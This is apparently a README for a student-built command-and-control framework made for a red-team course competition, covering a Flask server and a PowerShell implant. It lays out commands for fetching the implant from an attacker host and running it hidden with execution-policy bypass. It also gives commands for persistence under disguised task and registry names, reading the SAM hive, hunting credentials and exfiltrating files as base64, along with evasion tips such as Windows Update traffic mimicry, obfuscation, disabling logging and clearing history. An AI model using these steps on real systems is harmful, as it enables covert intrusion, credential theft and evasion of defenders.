# Phantom C2 Framework

**Author:** Koy Monette kfm9123@rit.edu
**Course:** CSEC-473 Cyber Defense Techniques  
**Category:** Red Team Infrastructure Tool  
**Purpose:** Custom Command and Control framework for authorized competition use

## Overview

Phantom C2 is a lightweight, custom-built Command and Control framework designed specifically for Red Team operations in cyber competitions. Unlike commercial C2 frameworks (Cobalt Strike, Metasploit), Phantom provides:

- **Custom implementation** - No commercial tool signatures to detect
- **Encrypted communications** - AES-256-CBC for all beacon traffic
- **Web-based dashboard** - Easy multi-operator interface
- **Jitter and randomization** - Variable beacon intervals avoid pattern detection
- **Windows Update mimicry** - Traffic disguised as legitimate Microsoft services
- **Windows-focused** - PowerShell implants work on most Windows targets

### Why This Tool is Valuable for Red Team

1. **Operational Security**: Custom code means Blue Team can't use signature-based detection
2. **Ease of Use**: Web dashboard allows multiple operators to manage beacons simultaneously
3. **Competition-Ready**: Designed for quick deployment in time-constrained competitions
4. **Reliable**: HTTP/S blends with normal traffic and works through most firewalls
5. **Extensible**: Clean codebase makes adding features straightforward

### Technical Approach

**Architecture:**
- **C2 Server**: Python/Flask web application (runs on Red Team infrastructure)
- **Implant/Beacon**: PowerShell script (deploys to Windows targets)
- **Protocol**: HTTP with AES-256-CBC encryption
- **Beaconing**: Variable intervals (30-60 seconds default) with jitter
- **Persistence**: Key and beacon ID saved to disk for connection resilience

**Communication Flow:**
1. Implant beacons to C2 server via /windowsupdate/v6/reporting endpoint
2. Server queues commands for implants
3. Implant retrieves commands, executes them silently, stores results
4. Results sent back on next beacon (asynchronous execution)
5. All traffic encrypted end-to-end with AES-256-CBC
6. Traffic mimics legitimate Windows Update reporting for enhanced stealth
7. Decoy Microsoft endpoints add additional legitimacy to C2 server

## Requirements & Dependencies

### C2 Server Requirements

**Operating System:** Linux (tested on Kali 2025 Desktop)

**Python Version:** Python 3.8 or newer

**Required Python Libraries:**
```bash
Flask==2.3.0
cryptography==41.0.0
```

**Installation:**
```bash
pip3 install flask cryptography
# OR use requirements.txt:
pip3 install -r requirements.txt
```

**Privileges:** Normal user (no root required)

### Implant Requirements

**Target Operating System:** Windows 7/8/10/11, Windows Server 2012-2022

**PowerShell Version:** PowerShell 3.0+ (pre-installed on Windows 7+)

**Required Privileges:** User-level (no admin required for basic commands)

**Network Requirements:** Outbound HTTP access to C2 server (port 8080 default)

**No additional dependencies** - uses built-in PowerShell modules only

## Installation Instructions

### Step 1: Deploy C2 Server

**On your Red Team control machine (Linux):**

```bash
# Clone or extract the repository
cd redteam-c2/server

# Install dependencies
pip3 install flask cryptography

# Run the C2 server
python3 c2_server.py
```

**Expected Output:**
```
╔═══════════════════════════════════════════════════════════╗
║           PHANTOM C2 SERVER - STARTING UP                 ║
║  Authorized Competition Use Only                          ║
╚═══════════════════════════════════════════════════════════╝

[*] Server Key (hex): a1b2c3d4e5f6...
[*] Save this key for implant configuration!

[*] Dashboard Authentication:
    Username: redteam
    Password: YourSecurePassword
    ⚠️  CHANGE THESE CREDENTIALS in c2_server.py before deployment!

[*] Starting server on http://0.0.0.0:8080
[*] Dashboard: http://localhost:8080
[*] Key saved to server_key.txt
```

**Important:** 
1. Save the server key! You'll need it for configuring implants.
2. Change the default dashboard credentials before deployment! 

### Step 2: Configure the Implant

**On your workstation (before deployment):**

1. Open `implant/beacon.ps1` in a text editor
2. Modify the configuration section:

```powershell
param(
    [string]$ServerUrl = "http://YOUR_C2_IP:8080",
    [string]$ServerKey = "PASTE_KEY_FROM_SERVER_KEY_TXT"
)
```

Example:
```powershell
param(
    [string]$ServerUrl = "http://192.168.1.100:8080",
    [string]$ServerKey = "a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456"
)
```

3. Save the modified script

### Step 3: Deploy to Target

**Transfer the implant to the compromised Windows system:**

```powershell
# Option 1: Download from web server
Invoke-WebRequest -Uri "http://YOUR_IP/beacon.ps1" -OutFile "C:\Windows\Temp\beacon.ps1"

# Option 2: Copy via SMB
copy \\attacker\share\beacon.ps1 C:\Windows\Temp\

# Option 3: Base64 encode and paste (stealthier, no file on disk initially)

```

**Execute the beacon:**

```powershell
# Standard execution
powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\beacon.ps1

# Hidden execution (no window)
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\beacon.ps1

# Alternative: Pass parameters (no file modification needed)
powershell.exe -ExecutionPolicy Bypass -File beacon.ps1 -ServerUrl "http://192.168.1.100:8080" -ServerKey "KEY_HERE"
```

### Step 4: Verify Connection

1. Open the C2 dashboard: `http://YOUR_SERVER_IP:8080`
2. Wait 30-60 seconds for first beacon check-in
3. You should see the new beacon appear in the "Active Beacons" section
4. Click on the beacon to select it
5. Enter a test command (e.g., `whoami`) and click EXECUTE
7. Results appear within 30-120 seconds

## Usage Instructions

### Basic Usage

**Starting the C2 Server:**
```bash
cd server/
python3 c2_server.py
```

Access dashboard at: `http://localhost:8080` (or your server's IP)

**Dashboard Login:**
1. Enter the username and password you configured in `c2_server.py`
2. Browser will remember credentials for the session
3. If Blue Team discovers your C2 IP, they cannot access the dashboard

**Running Commands:**

1. Click on a beacon in the dashboard to select it
2. Enter command in the input box
3. Click "EXECUTE" or press Enter
4. Results appear in the "Command Results" section within 30-60 seconds

**Common Commands:**
```powershell
whoami                          # Current user
hostname                        # Computer name
ipconfig                        # Network configuration
Get-Process                     # Running processes
Get-LocalUser                   # Local user accounts
net user                        # Domain users
dir C:\Users                    # Directory listing
Get-Content C:\file.txt         # Read file
```

### Advanced Usage

**File Operations:**

```powershell
# Read sensitive files
Get-Content C:\Windows\System32\config\SAM

# Search for credentials
Get-ChildItem C:\ -Recurse -Include *.txt,*.config,*.xml | Select-String -Pattern "password"

# Download file (to memory, then exfil via command output)
$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\secrets.txt"))
Write-Output $data
```

**Reconnaissance:**

```powershell
# Network shares
net view \\TARGET /all

# Active Directory enumeration
Get-ADUser -Filter * -Property *

# Running services
Get-Service | Where-Object {$_.Status -eq "Running"}

# Scheduled tasks
Get-ScheduledTask

# Find interesting files
Get-ChildItem -Path C:\Users -Recurse -Include *.kdbx,*.key,*password*,*credential* -ErrorAction SilentlyContinue
```

**Persistence (Admin Required):**

```powershell
# Registry Run key
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Updater" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -File C:\beacon.ps1"

# Scheduled task
schtasks /create /sc minute /mo 30 /tn "SystemUpdate" /tr "powershell.exe -File C:\beacon.ps1"
```

### Example Workflow

**Scenario: Post-Exploitation on Windows Server**

```powershell
# 1. Initial reconnaissance
whoami
hostname
ipconfig /all
systeminfo

# 2. Identify privileges
whoami /priv
whoami /groups

# 3. Enumerate users
net user
net localgroup administrators

# 4. Search for credentials
Get-ChildItem C:\Users -Recurse -Include web.config,*.xml,*.txt -ErrorAction SilentlyContinue | Select-String -Pattern "password"

# 5. Check for other systems
arp -a
net view

# 6. If admin, dump credentials
# (Would require admin and additional tools - outside basic C2 scope)
```

## Operational Notes

### Competition Usage Scenarios

**Initial Compromise:**
- Phishing email with malicious macro → Macro downloads and executes beacon
- Web shell → Use web shell to execute PowerShell beacon
- RDP access → Manually run beacon
- Exploitation → Post-exploit command execution runs beacon

**Maintaining Access:**
1. Deploy beacon immediately after initial compromise
2. Add persistence mechanism (scheduled task, registry run key)
3. Establish multiple beacons on critical systems
4. Use C2 to coordinate lateral movement

**Coordination with Team:**
- Dashboard supports multiple operators viewing same beacons
- Share C2 server IP and dashboard credentials with Red Team only
- Document which beacons are on which systems
- Avoid conflicting commands to same beacon

### OpSec Considerations

**What Logs Does This Create?**

**Network Traffic:**
- HTTP POST requests to `/windowsupdate/v6/reporting` endpoint
- Mimics legitimate Windows Update reporting traffic
- Encrypted payload (looks like random base64)
- Regular periodic traffic every 30-60 seconds (matches Windows Update check-in patterns)
- Decoy endpoints (`/windowsupdate/v6/status, /v10/ping, /msdownload/*`) provide additional legitimacy
- **Detection Risk:** Medium - HTTP traffic is common, but periodic patterns can be detected by NetFlow analysis
- **Mitigation:** Use HTTPS for additional encryption layer, traffic already mimics expected Windows behavior

**Process Activity:**
- PowerShell.exe process running beacon script
- **Detection Risk:** High if PowerShell logging enabled
- **Mitigation:** Use `-WindowStyle Hidden` to avoid visible windows

**File System:**
- beacon.ps1 script on disk (if file-based execution)
- `phantom_beacon_id.txt` in user's temp directory (persistent beacon ID)
- **Detection Risk:** Medium - AV/EDR may scan and detect
- **Mitigation:** Run from memory (base64 encoded), obfuscate script

**Windows Event Logs:**
- PowerShell execution logged in Event ID 4104 (Script Block Logging)
- Process creation logged in Event ID 4688 (if enabled)
- **Detection Risk:** High if logging enabled and reviewed
- **Mitigation:** Disable logging (requires admin), execute quickly and remove

**Registry:**
- No registry artifacts unless persistence is added
- **Detection Risk:** Low for basic operation

### Detection Risks and Mitigation

| Risk | Likelihood | Mitigation |
|------|-----------|-----------|
| Network IDS detects periodic HTTP beacons | Medium | Use HTTPS, vary beacon intervals more, use domain fronting |
| EDR flags PowerShell execution | High | Obfuscate script, use alternate execution methods (WMI, scheduled tasks) |
| AV detects beacon.ps1 on disk | Medium | Run from memory, change variable names, add junk code |
| Blue Team analyzes network traffic | Medium | Switch to DNS tunneling, use encrypted C2 channels |
| SOC correlates multiple beacons from same source | Low | Use different C2 servers, vary beacon timing per host |

### Cleanup/Removal Process

**To cleanly remove the beacon from a target:**

1. Send `exit` command via C2 dashboard
2. Beacon terminates gracefully
3. Manually delete beacon.ps1 file (if on disk)
4. Remove persistence mechanisms:
   ```powershell
   # Remove registry run key
   reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Updater" /f
   
   # Remove scheduled task
   schtasks /delete /tn "SystemUpdate" /f
   ```
5. Clear PowerShell history:
   ```powershell
   Remove-Item (Get-PSReadlineOption).HistorySavePath
   ```

**Server Shutdown:**
1. Ctrl+C in terminal running c2_server.py
2. All beacons will fail to check in and eventually timeout
3. Persistent server artifacts: `server_key.bin`, `server_key.txt`

## Improvements Implemented During Development

This section documents enhancements made during testing and development:

### 1. **Endpoint Obfuscation - Windows Update Mimicry**

**Implementation:**
- Changed endpoint from `/beacon/checkin` to `/windowsupdate/v6/reporting`
- Added decoy endpoints:
  - `/windowsupdate/v6/status` - Mimics update status checks
  - `/v10/ping` - Mimics Windows telemetry
  - `/msdownload/update/v3/static/trustedr/en/authrootstl.cab` - Mimics Microsoft downloads

**Impact:** Network traffic appears as legitimate Windows Update reporting, making detection significantly harder

### 2. **Dashboard Authentication**

**Implementation:**
- HTTP Basic Authentication on all dashboard routes
- Configurable username/password
- Beacon endpoints remain unauthenticated (required for beacon access)

**Impact:** Blue Team cannot enumerate compromised systems even if they discover C2 server IP

### 3. **Persistent Server Encryption Key**

**Implementation:**
- Server saves encryption key to `server_key.bin`
- Loads existing key on startup if present
- Beacons can reconnect after server restarts

**Impact:** Operational resilience - server crashes don't lose all beacon access

### 4. **Persistent Beacon ID**

**Implementation:**
- Beacon saves ID to `phantom_beacon_id.txt` in temp directory
- Reuses same ID on reconnection

**Impact:** Clean dashboard - one beacon per compromised system, easier management


## Limitations

### Current Limitations

1. **Windows Only**: Implant only works on Windows (PowerShell required)
   - **Why:** PowerShell is native to Windows and provides easy command execution
   - **Future:** Could add Python/Bash beacons for Linux

2. **HTTP Only**: No HTTPS support (traffic is encrypted but not using TLS)
   - **Why:** Simplifies setup, focuses on AES encryption
   - **Future:** Add HTTPS support with self-signed or Let's Encrypt certificates

3. **Single C2 Server**: No redundancy or fallback C2 servers
   - **Why:** Complexity vs. competition timeframe trade-off
   - **Future:** Support multiple C2 server URLs in implant

4. **Limited Functionality**: Basic command execution only (no file upload/download GUI)
   - **Why:** Core functionality first, additional features later
   - **Future:** Add dedicated file transfer, screenshot capture, keylogging modules

5. **Basic Authentication**: HTTP Basic Auth (credentials sent with each request)
   - **Why:** Simple to implement, adequate for competition environment
   - **Future:** Token-based authentication, session management

6. **Synchronous Command Execution**: Commands queue but execute sequentially
   - **Why:** Simpler implementation
   - **Future:** Parallel command execution for faster operations

### Known Issues

1. **Large Output**: Command output truncated at 10,000 characters
   - Workaround: Break large outputs into chunks or write to file and read in pieces

2. **Network Interruptions**: If beacon loses connection during command execution, results may be lost
   - Workaround: Re-run command; server now has persistent key for reconnection

3. **PowerShell Execution Policy**: Some systems enforce strict policies
   - Workaround: Use `-ExecutionPolicy Bypass` or `-Exec Bypass` flags

4. **Clock Skew**: Server/implant time mismatch may cause issues
   - Workaround: Use NTP to sync time; server uses timestamp from client

### Future Improvement Ideas

**High Priority:**
- HTTPS/TLS support with valid certificates
- File upload/download GUI in dashboard
- Linux/macOS implant variants
- Implant auto-update mechanism
- Multi-C2 server fallback

**Medium Priority:**
- Task scheduling (execute command at specific time)
- Credential harvesting modules
- Screenshot capture
- Process injection capabilities
- SOCKS proxy through beacon

**Low Priority:**
- Alternate C2 channels (DNS, ICMP, SMB)
- Plugin architecture for custom modules
- Automated lateral movement tools
- Integration with Metasploit
- Mobile dashboard (responsive design)

## Credits & References

### Resources Consulted

**C2 Framework Concepts:**
- MITRE ATT&CK TA0011 Command and Control: https://attack.mitre.org/tactics/TA0011/
- The C2 Matrix: https://www.thec2matrix.com/
- Red Team Development and Operations by Joe Vest and James Tubberville

**Encryption Implementation:**
- Python Cryptography Documentation: https://cryptography.io/
- AES-256-CBC Implementation Guide

**PowerShell Development:**
- PowerShell Documentation: https://docs.microsoft.com/en-us/powershell/
- PowerShell Best Practices

**Flask Web Framework:**
- Flask Documentation: https://flask.palletsprojects.com/
- Flask-HTTPAuth for authentication

**Similar Projects (Studied for Inspiration, Not Copied):**
- Sliver C2: https://github.com/BishopFox/sliver
- Mythic C2: https://github.com/its-a-feature/Mythic
- Empire PowerShell: https://github.com/BC-SECURITY/Empire


---

## Legal & Ethical Notice

⚠️ **AUTHORIZED USE ONLY** ⚠️

This tool is designed for **educational purposes** and **authorized competition use only**.

**Permitted Use:**
- CSEC-473 course competitions with instructor authorization
- Personal lab environments you own or have explicit permission to test
- Authorized penetration testing engagements with written permission

**Prohibited Use:**
- RIT systems without explicit authorization
- Other students' personal devices
- Any external systems without written permission
- Any illegal or malicious activities

**By using this tool, you agree to:**
1. Only use it in authorized contexts
2. Accept full responsibility for your actions
3. Report any discovered vulnerabilities responsibly
4. Not distribute this tool irresponsibly

---

## Version History

**v1.0 (Current)** - February 2026
- Basic HTTP C2 functionality
- AES-256-CBC encryption
- Web-based dashboard with HTTP Basic Authentication
- PowerShell implant for Windows (verbose and silent versions)
- Command queueing and asynchronous execution
- Result retrieval and display
- Endpoint obfuscation (Windows Update mimicry)
- Decoy Microsoft endpoints
- Persistent encryption key and beacon IDs
- Silent operation mode for maximum stealth

---

**Built with ⚡ for CSEC-473 Red Team Operations**

